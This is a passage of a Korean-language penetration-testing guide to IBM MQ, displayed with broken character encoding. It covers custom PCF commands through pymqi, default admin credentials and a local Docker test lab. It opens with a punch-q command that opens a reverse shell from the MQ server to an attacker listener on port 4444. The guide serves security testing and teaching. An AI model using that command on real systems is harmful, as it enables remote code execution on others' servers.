â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### ì»¤ìŠ¤í…€ PCF

IBM MQ ë¬¸ì„œë¥¼ ì°¸ì¡°í•˜ì—¬ **pymqi** íŒŒì´ì¬ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì§ì ‘ ì‚¬ìš©í•˜ì—¬ **punch-q**ì—ì„œ êµ¬í˜„ë˜ì§€ ì•Šì€ íŠ¹ì • PCF ëª…ë ¹ì„ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì˜ˆì‹œ:**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
ë§Œì•½ ìƒìˆ˜ ì´ë¦„ì„ ì°¾ì„ ìˆ˜ ì—†ë‹¤ë©´, [IBM MQ ë¬¸ì„œ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors)ë¥¼ ì°¸ì¡°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

> *ì˜ˆì‹œë¡œ [`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster) (10ì§„ìˆ˜ = 73)ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ëŠ” `MQCA_CLUSTER_NAME` (10ì§„ìˆ˜ = 2029) ë§¤ê°œë³€ìˆ˜ë¥¼ í•„ìš”ë¡œ í•©ë‹ˆë‹¤. ì´ëŠ” `*`ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë¬¸ì„œ: ):*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Error")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## í…ŒìŠ¤íŠ¸ í™˜ê²½

IBM MQ ë™ì‘ ë° ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•˜ë ¤ë©´ Dockerë¥¼ ê¸°ë°˜ìœ¼ë¡œ ë¡œì»¬ í™˜ê²½ì„ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. ibm.com ë° cloud.ibm.comì— ê³„ì •ì„ ê°€ì§€ê³  ìˆì–´ì•¼ í•©ë‹ˆë‹¤.
2. ë‹¤ìŒê³¼ ê°™ì´ ì»¨í…Œì´ë„ˆí™”ëœ IBM MQë¥¼ ìƒì„±í•©ë‹ˆë‹¤:
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
ê¸°ë³¸ì ìœ¼ë¡œ ì¸ì¦ì´ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©°, ì‚¬ìš©ì ì´ë¦„ì€ `admin`ì´ê³  ë¹„ë°€ë²ˆí˜¸ëŠ” `passw0rd`ì…ë‹ˆë‹¤ (í™˜ê²½ ë³€ìˆ˜ `MQ_ADMIN_PASSWORD`).
ì—¬ê¸°ì—ì„œ í ë§¤ë‹ˆì € ì´ë¦„ì€ `MYQUEUEMGR`ë¡œ ì„¤ì •ë˜ì—ˆìŠµë‹ˆë‹¤ (ë³€ìˆ˜ `MQ_QMGR_NAME`).

IBM MQê°€ ì‹¤í–‰ ì¤‘ì´ê³  í¬íŠ¸ê°€ ë…¸ì¶œë˜ì–´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤:
```bash
â¯ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> IBM MQ ë„ì»¤ ì´ë¯¸ì§€ì˜ ì´ì „ ë²„ì „ì€ ë‹¤ìŒ ìœ„ì¹˜ì— ìˆìŠµë‹ˆë‹¤: https://hub.docker.com/r/ibmcom/mq/.

## ì°¸ê³  ìë£Œ

* [mgeekyì˜ gist - "ì‹¤ìš©ì ì¸ IBM MQ íœí…ŒìŠ¤íŒ… ë…¸íŠ¸"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [IBM MQ ë¬¸ì„œ](https://www.ibm.com/docs/en/ibm-mq)
